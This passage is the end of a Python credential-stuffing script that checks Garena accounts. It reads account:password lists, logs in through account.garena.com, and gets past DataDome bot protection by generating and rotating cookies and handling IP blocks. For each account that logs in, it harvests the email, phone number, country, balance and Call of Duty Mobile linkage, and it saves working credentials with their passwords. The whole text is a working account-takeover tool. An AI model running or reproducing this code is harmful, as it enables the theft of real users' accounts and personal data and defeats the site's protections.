                logger.info(f"[COOKIE] Generated new DataDome: {datadome[:30]}...")
        
        final_cookies = session.cookies.get_dict()
        logger.debug(f"[DEBUG] Cookies before prelogin: {list(final_cookies.keys())}")
        
        v1, v2, new_datadome = prelogin(session, account, datadome_manager)
        
        if v1 == "IP_BLOCKED":
            return f"[ERROR] {account}: IP Blocked - New DataDome required"
        
        if not v1 or not v2:
            live_stats.update_stats(valid=False)
            return f"[ERROR] {account}: Invalid (Prelogin failed)"
        
        if new_datadome:
            datadome_manager.set_datadome(new_datadome)
            datadome_manager.set_session_datadome(session, new_datadome)
            logger.info(f"[𝙄𝙉𝙁𝙊] Updated DataDome from prelogin: {new_datadome[:30]}...")
        
        sso_key = login(session, account, password, v1, v2)
        if not sso_key:
            live_stats.update_stats(valid=False)
            return f"[ERROR] {account}: Invalid (Login failed)"
        
        current_cookies = session.cookies.get_dict()
        cookie_parts = []
        for cookie_name in ['apple_state_key', 'datadome', 'sso_key']:
            if cookie_name in current_cookies:
                cookie_parts.append(f"{cookie_name}={current_cookies[cookie_name]}")
        cookie_header = '; '.join(cookie_parts) if cookie_parts else ''
        
        headers = {
            'accept': '*/*',
            'referer': 'https://account.garena.com/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/129.0.0.0 Safari/537.36'
        }
        
        if cookie_header:
            headers['cookie'] = cookie_header
        
        response = session.get('https://account.garena.com/api/account/init', headers=headers, timeout=30)
        
        if response.status_code == 403:
            if datadome_manager.handle_403(session):
                return f"[ERROR] {account}: IP Blocked - New DataDome required"
            live_stats.update_stats(valid=False)
            return f"[ERROR] {account}: Banned (Cookie flagged)"
            
        try:
            account_data = response.json()
        except json.JSONDecodeError as e:
            logger.error(f"[ERROR] Invalid JSON response from account init for {account}: {e}")
            live_stats.update_stats(valid=False)
            return f"[ERROR] {account}: Invalid response from server"
        
        if 'error' in account_data:
            if account_data.get('error') == 'error_auth':
                live_stats.update_stats(valid=False)
                return f"[WARNING] {account}: Invalid (Authentication error)"
            live_stats.update_stats(valid=False)
            return f"[WARNING] {account}: Error fetching details ({account_data['error']})"
        
        if 'user_info' in account_data:
            details = parse_account_details(account_data)
        else:
            details = parse_account_details({'user_info': account_data})
        
        has_codm, codm_info = check_codm_account(session, account)
        
        fresh_datadome = datadome_manager.extract_datadome_from_session(session)
        if fresh_datadome:
            cookie_manager.save_cookie(fresh_datadome)
            logger.info(f"[𝙄𝙉𝙁𝙊] Fresh cookie obtained for next account")
        
        if has_codm:
            save_codm_accounts(account, password, codm_info, details['is_clean'])
        
        live_stats.update_stats(valid=True, clean=details['is_clean'], has_codm=has_codm)
        
        shell_balance = details['profile']['shell_balance']
        bind_status_display = "[CLEAN]" if details['is_clean'] else f"[BOUND]"
        
        result = f"[SUCCESS] {account}:{password} | {bind_status_display} | {details['security_status']} | {details['uid']} | {details['nickname']} | {details['email']} | {details['personal']['mobile_no']} | {details['personal']['country']} | {shell_balance} SHELL"
        
        if has_codm:
            result += display_codm_info(account, codm_info)
        
        return result
        
    except Exception as e:
        logger.error(f"[ERROR] Unexpected error processing {account}: {e}")
        live_stats.update_stats(valid=False)
        return f"[ERROR] {account}: Processing error"

def main():
    filename = input("Enter the filename containing accounts: ").strip()
    
    if not os.path.exists(filename):
        logger.error(f"[ERROR] File '{filename}' not found.")
        return
    
    cookie_manager = CookieManager()
    datadome_manager = DataDomeManager()
    live_stats = LiveStats()
    
    session = cloudscraper.create_scraper()
    
    initial_cookie = cookie_manager.get_valid_cookie()
    if initial_cookie:
        logger.info(f"[𝙄𝙉𝙁𝙊] Using saved cookie")
        applyck(session, initial_cookie)
    else:
        logger.info(f"[𝙄𝙉𝙁𝙊] No saved cookies found. Starting fresh session.")
        
        datadome = get_datadome_cookie(session)
        if datadome:
            datadome_manager.set_datadome(datadome)
            logger.info(f"[𝙄𝙉𝙁𝙊] Generated initial DataDome cookie")
    
    with open(filename, 'r', encoding='utf-8') as file:
        accounts = [line.strip() for line in file if line.strip()]
    
    logger.info(f"[𝙄𝙉𝙁𝙊] Total accounts to process: {len(accounts)}")
    
    for i, account_line in enumerate(accounts, 1):
        if ':' not in account_line:
            logger.warning(f"[WARNING] Skipping invalid account line: {account_line}")
            continue
            
        account, password = account_line.split(':', 1)
        account = account.strip()
        password = password.strip()
        
        logger.info(f"[𝙄𝙉𝙁𝙊] Processing {i}/{len(accounts)}: {account}... ")
        
        result = processaccount(session, account, password, cookie_manager, datadome_manager, live_stats)
        logger.info(result)
        
        print(f"\n{live_stats.display_stats()}", flush=True)
        
        time.sleep(1)
    
    final_stats = live_stats.get_stats()
    print()
    logger.info(f"[FINAL STATS] VALID: {final_stats['valid']} | INVALID: {final_stats['invalid']} | CLEAN: {final_stats['clean']} | NOT CLEAN: {final_stats['not_clean']} | HAS CODM: {final_stats['has_codm']} | NO CODM: {final_stats['no_codm']} -> config @poqruette")

if __name__ == "__main__":
    main()